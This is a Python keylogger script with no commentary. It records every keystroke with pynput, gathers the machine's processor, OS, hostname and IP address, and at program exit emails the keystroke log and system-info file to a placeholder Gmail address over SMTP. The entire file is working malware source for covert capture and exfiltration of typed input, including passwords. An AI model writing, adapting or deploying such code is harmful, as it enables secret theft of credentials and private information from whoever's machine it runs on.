from pynput.keyboard import Key, Listener
import socket
import platform
import os 
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import atexit

keys_info = "key_log.txt"
sys_info = "system_info.txt"

file_path = os.getcwd()
extend = "\\"
file_merge = file_path + extend

def send_email(filename, attachment, toaddr):
    fromaddr = "from@gmail.com"

    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "Log filt attached"

    msg.attach(MIMEText(body,'plain'))

    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', f"attachment; filename={filename}")

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr,"password")

    text = msg.as_string()
    s.sendmail(fromaddr,toaddr,text)
    s.quit()

def send_logs():
    toaddr = "to@gmail.com"
    send_email(keys_info,file_path + extend + keys_info, toaddr)
    send_email(sys_info, file_path + extend + sys_info, toaddr)
    print("Sent")

atexit.register(send_logs)

count = 0
keys = []

def computer_information():
    with open(file_path + extend + sys_info, "a") as f:
        hostname = socket.gethostname()
        try:
            IPAddr = socket.gethostbyname(hostname)
        except socket.gaierror:
            IPAddr = "Could not get IP address"
        
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + "\n")
        f.write("IP Address: " + IPAddr + "\n")

computer_information()

def on_press(key):
    print(key,end=" ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)

def write_file(keys):
    with open(file_path + extend + keys_info,"a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.startswith("Key."):
                if k == "Key.space":
                    f.write(" ")
                elif k == "Key.enter":
                    f.write("\n")
            elif len(k) == 3 and k.startswith("'") and k.endswith("'"):
                f.write(k[1])
            else:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
